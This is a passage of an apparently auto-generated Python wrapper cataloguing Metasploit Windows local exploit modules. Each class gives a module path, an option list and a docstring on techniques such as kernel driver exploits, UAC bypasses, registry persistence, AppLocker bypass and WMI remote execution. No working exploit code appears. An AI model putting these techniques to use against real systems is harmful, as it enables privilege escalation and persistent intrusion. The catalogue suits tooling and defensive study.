			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'
			FILENAME = 'FILENAME'
			PATH = 'PATH'
			required_TECHNIQUE = 'TECHNIQUE'

	class windows_local_novell_client_nicm(object):
		"""
		
        This module exploits a flaw in the nicm.sys driver to execute arbitrary code in
        kernel space. The vulnerability occurs while handling ioctl requests with code
        0x143B6B, where a user provided pointer is used as function pointer. The module
        has been tested successfully on Windows 7 SP1 with Novell Client 2 SP3.
      
		"""

		path = 'windows/local/novell_client_nicm'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'

	class windows_local_ms13_005_hwnd_broadcast(object):
		"""
		
        Due to a problem with isolating window broadcast messages in the Windows kernel,
        an attacker can broadcast commands from a lower Integrity Level process to a
        higher Integrity Level process, thereby effecting a privilege escalation. This
        issue affects Windows Vista, 7, 8, Server 2008, Server 2008 R2, Server 2012, and
        RT. Note that spawning a command prompt with the shortcut key combination Win+Shift+#
        does not work in Vista, so the attacker will have to check if the user is already
        running a command prompt and set SPAWN_PROMPT false.

        Three exploit techniques are available with this module. The WEB technique will
        execute a powershell encoded payload from a Web location.  The FILE technique
        will drop an executable to the file system, set it to medium integrity and execute
        it. The TYPE technique will attempt to execute a powershell encoded payload directly
        from the command line, but may take some time to complete.
      
		"""

		path = 'windows/local/ms13_005_hwnd_broadcast'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			FileDropperDelay = 'FileDropperDelay'
			required_SPAWN_PROMPT = 'SPAWN_PROMPT'
			required_TECHNIQUE = 'TECHNIQUE'
			CUSTOM_COMMAND = 'CUSTOM_COMMAND'

	class windows_local_wmi(object):
		"""
		
          This module executes powershell on the remote host using the current
          user credentials or those supplied. Instead of using PSEXEC over TCP
          port 445 we use the WMIC command to start a Remote Procedure Call on
          TCP port 135 and an ephemeral port. Set ReverseListenerComm to tunnel
          traffic through that session.

          The result is similar to psexec but with the added benefit of using
          the session's current authentication token instead of having to know
          a password or hash.

          The remote host must be configured to allow remote Windows Management
          Instrumentation.
        
		"""

		path = 'windows/local/wmi'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'
			SMBUser = 'SMBUser'
			SMBPass = 'SMBPass'
			SMBDomain = 'SMBDomain'
			required_TIMEOUT = 'TIMEOUT'
			required_RHOSTS = 'RHOSTS'
			ReverseListenerComm = 'ReverseListenerComm'

	class windows_local_bypassuac(object):
		"""
		
        This module will bypass Windows UAC by utilizing the trusted publisher
        certificate through process injection. It will spawn a second shell that
        has the UAC flag turned off.
      
		"""

		path = 'windows/local/bypassuac'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'
			required_TECHNIQUE = 'TECHNIQUE'

	class windows_local_ms10_092_schelevator(object):
		"""
		
          This module exploits the Task Scheduler 2.0 XML 0day exploited by Stuxnet.
        When processing task files, the Windows Task Scheduler only uses a CRC32
        checksum to validate that the file has not been tampered with. Also, In a default
        configuration, normal users can read and write the task files that they have
        created. By modifying the task file and creating a CRC32 collision, an attacker
        can execute arbitrary commands with SYSTEM privileges.

        NOTE: Thanks to webDEViL for the information about disable/enable.
      
		"""

		path = 'windows/local/ms10_092_schelevator'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			CMD = 'CMD'
			TASKNAME = 'TASKNAME'

	class windows_local_bypassuac_vbs(object):
		"""
		
        This module will bypass Windows UAC by utilizing the missing .manifest on the script host
        cscript/wscript.exe binaries.
      
		"""

		path = 'windows/local/bypassuac_vbs'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			FileDropperDelay = 'FileDropperDelay'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'

	class windows_local_current_user_psexec(object):
		"""
		
          This module uploads an executable file to the victim system, creates
          a share containing that executable, creates a remote service on each
          target system using a UNC path to that file, and finally starts the
          service(s).

          The result is similar to psexec but with the added benefit of using
          the session's current authentication token instead of having to know
          a password or hash.
        
		"""

		path = 'windows/local/current_user_psexec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'
			INTERNAL_ADDRESS = 'INTERNAL_ADDRESS'
			NAME = 'NAME'
			DISPNAME = 'DISPNAME'
			required_TECHNIQUE = 'TECHNIQUE'
			RHOSTS = 'RHOSTS'
			required_KERBEROS = 'KERBEROS'

	class windows_local_registry_persistence(object):
		"""
		
        This module will install a payload that is executed during boot.
        It will be executed either at user logon or system startup via the registry
        value in "CurrentVersion/Run" (depending on privilege and selected method).
        The payload will be installed completely in registry.
      
		"""

		path = 'windows/local/registry_persistence'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'
			required_STARTUP = 'STARTUP'
			BLOB_REG_KEY = 'BLOB_REG_KEY'
			BLOB_REG_NAME = 'BLOB_REG_NAME'
			RUN_NAME = 'RUN_NAME'
			CREATE_RC = 'CREATE_RC'
			SLEEP_TIME = 'SLEEP_TIME'

	class windows_local_bypassuac_eventvwr(object):
		"""
		
        This module will bypass Windows UAC by hijacking a special key in the Registry under
        the current user hive, and inserting a custom command that will get invoked when
        the Windows Event Viewer is launched. It will spawn a second shell that has the UAC
        flag turned off.

        This module modifies a registry key, but cleans up the key once the payload has
        been invoked.

        The module does not require the architecture of the payload to match the OS. If
        specifying EXE::Custom your DLL should call ExitProcess() after starting your
        payload in a separate process.
      
		"""

		path = 'windows/local/bypassuac_eventvwr'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'

	class windows_local_service_permissions(object):
		"""
		
        This module attempts to exploit existing administrative privileges to obtain
        a SYSTEM session. If directly creating a service fails, this module will inspect
        existing services to look for insecure file or configuration permissions that may
        be hijacked. It will then attempt to restart the replaced service to run the
        payload. This will result in a new session when this succeeds.
      
		"""

		path = 'windows/local/service_permissions'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			FileDropperDelay = 'FileDropperDelay'
			AGGRESSIVE = 'AGGRESSIVE'

	class windows_local_applocker_bypass(object):
		"""
		
        This module will generate a .NET service executable on the target and utilise
        InstallUtil to run the payload bypassing the AppLocker protection.

        Currently only the InstallUtil method is provided, but future methods can be
        added easily.
      
		"""

		path = 'windows/local/applocker_bypass'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			FileDropperDelay = 'FileDropperDelay'
			required_TECHNIQUE = 'TECHNIQUE'

	class windows_local_bthpan(object):
		"""
		
        A vulnerability within Microsoft Bluetooth Personal Area Networking module,
        BthPan.sys, can allow an attacker to inject memory controlled by the attacker
        into an arbitrary location. This can be used by an attacker to overwrite
        HalDispatchTable+0x4 and execute arbitrary code by subsequently calling
        NtQueryIntervalProfile.
      
		"""

		path = 'windows/local/bthpan'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'

	class windows_local_trusted_service_path(object):
		"""
		
        This module exploits a logic flaw due to how the lpApplicationName parameter
        is handled.  When the lpApplicationName contains a space, the file name is
        ambiguous.  Take this file path as example: C:/program files/hello.exe;
        The Windows API will try to interpret this as two possible paths:
        C:/program.exe, and C:/program files/hello.exe, and then execute all of them.
        To some software developers, this is an unexpected behavior, which becomes a
        security problem if an attacker is able to place a malicious executable in one
        of these unexpected paths, sometimes escalate privileges if run as SYSTEM.
        Some software such as OpenVPN 2.1.1, OpenSSH Server 5, and others have the
        same problem.

        The offensive technique is also described in Writing Secure Code (2nd Edition),
        Chapter 23, in the section "Calling Processes Security" on page 676.
      
		"""

		path = 'windows/local/trusted_service_path'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			FileDropperDelay = 'FileDropperDelay'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_local_ntapphelpcachecontrol(object):
		"""
		
        On Windows, the system call NtApphelpCacheControl (the code is actually in ahcache.sys)
        allows application compatibility data to be cached for quick reuse when new processes are
        created. A normal user can query the cache but cannot add new cached entries as the
        operation is restricted to administrators. This is checked in the function
        AhcVerifyAdminContext.

        This function has a vulnerability where it doesn't correctly check the impersonation token
        of the caller to determine if the user is an administrator. It reads the caller's
        impersonation token using PsReferenceImpersonationToken and then does a comparison between
        the user SID in the token to LocalSystem's SID. It doesn't check the impersonation level
        of the token so it's possible to get an identify token on your thread from a local system
        process and bypass this check.

        This module currently only affects Windows 8 and Windows 8.1, and requires access to
        C:/Windows/System/ComputerDefaults.exe (although this can be improved).
      
		"""

		path = 'windows/local/ntapphelpcachecontrol'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_local_mqac_write(object):
		"""
		
        A vulnerability within the MQAC.sys module allows an attacker to
        overwrite an arbitrary location in kernel memory.

        This module will elevate itself to SYSTEM, then inject the payload
        into another SYSTEM process.
      
		"""

		path = 'windows/local/mqac_write'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'

	class windows_local_ms16_032_secondary_logon_handle_privesc(object):
		"""
		
        This module exploits the lack of sanitization of standard handles in Windows' Secondary
        Logon Service.  The vulnerability is known to affect versions of Windows 7-10 and 2k8-2k12
        32 and 64 bit.  This module will only work against those versions of Windows with
        Powershell 2.0 or later and systems with two or more CPU cores.
      
		"""

		path = 'windows/local/ms16_032_secondary_logon_handle_privesc'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'
			W_PATH = 'W_PATH'
			DRY_RUN = 'DRY_RUN'
			TIMEOUT = 'TIMEOUT'

	class windows_local_ms14_009_ie_dfsvc(object):
		"""
		
        This module abuses a process creation policy in Internet Explorer's sandbox, specifically
        in the .NET Deployment Service (dfsvc.exe), which allows the attacker to escape the
        Enhanced Protected Mode, and execute code with Medium Integrity.
      
		"""

		path = 'windows/local/ms14_009_ie_dfsvc'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_local_virtual_box_guest_additions(object):
		"""
		
        A vulnerability within the VBoxGuest driver allows an attacker to inject memory they
        control into an arbitrary location they define. This can be used by an attacker to
        overwrite HalDispatchTable+0x4 and execute arbitrary code by subsequently calling
        NtQueryIntervalProfile on Windows XP SP3 systems. This has been tested with VBoxGuest
        Additions up to 4.3.10r93012.
      
		"""

		path = 'windows/local/virtual_box_guest_additions'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'

	class windows_local_powershell_cmd_upgrade(object):
		"""
		
          This module executes Powershell to upgrade a Windows Shell session
          to a full Meterpreter session.
        
		"""

		path = 'windows/local/powershell_cmd_upgrade'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'

	class windows_local_ps_persist(object):
		"""
		
        This module generates a dynamic executable on the session host using .NET templates.
        Code is pulled from C# templates and impregnated with a payload before being
        sent to a modified PowerShell session with .NET 4 loaded. The compiler builds
        the executable (standard or Windows service) in memory and produces a binary
        which can be started/installed and downloaded for later use. After compilation the
        PoweShell session can also sign the executable if provided a path the a .pfx formatted
        certificate.
      
		"""

		path = 'windows/local/ps_persist'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			WfsDelay = 'WfsDelay'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			required_SESSION = 'SESSION'
			required_Powershell_persist = 'Powershell::persist'
			Powershell_prepend_sleep = 'Powershell::prepend_sleep'
			required_Powershell_strip_comments = 'Powershell::strip_comments'
			required_Powershell_strip_whitespace = 'Powershell::strip_whitespace'
			required_Powershell_sub_vars = 'Powershell::sub_vars'
			required_Powershell_sub_funcs = 'Powershell::sub_funcs'
			required_Powershell_exec_in_place = 'Powershell::exec_in_place'
			required_Powershell_encode_final_payload = 'Powershell::encode_final_payload'
			required_Powershell_encode_inner_payload = 'Powershell::encode_inner_payload'
			required_Powershell_use_single_quotes = 'Powershell::use_single_quotes'
			required_Powershell_no_equals = 'Powershell::no_equals'
			required_Powershell_method = 'Powershell::method'
			required_Powershell_Post_timeout = 'Powershell::Post::timeout'
			required_Powershell_Post_log_output = 'Powershell::Post::log_output'
			required_Powershell_Post_dry_run = 'Powershell::Post::dry_run'
			required_Powershell_Post_force_wow64 = 'Powershell::Post::force_wow64'
			CERT_PATH = 'CERT_PATH'
			SVC_GEN = 'SVC_GEN'
			SVC_NAME = 'SVC_NAME'
			SVC_DNAME = 'SVC_DNAME'
			START_APP = 'START_APP'
			OUTPUT_TARGET = 'OUTPUT_TARGET'
			SVC_REMOVE = 'SVC_REMOVE'
			BypassUAC = 'BypassUAC'
			USERNAME = 'USERNAME'
			PASSWORD = 'PASSWORD'
			DOMAIN = 'DOMAIN'

	class windows_local_ikeext_service(object):
		"""
		
        This module exploits a missing DLL loaded by the 'IKE and AuthIP Keyring Modules'
        (IKEEXT) service which runs as SYSTEM, and starts automatically in default
